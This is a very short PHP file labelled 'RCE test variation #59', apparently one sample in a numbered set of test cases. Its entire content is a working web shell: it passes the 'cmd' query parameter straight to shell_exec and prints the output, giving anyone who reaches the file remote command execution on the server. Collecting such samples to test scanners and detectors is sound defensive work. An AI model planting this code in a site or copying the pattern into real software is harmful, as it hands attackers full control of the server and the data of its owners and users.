<?php
// RCE test variation #59
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>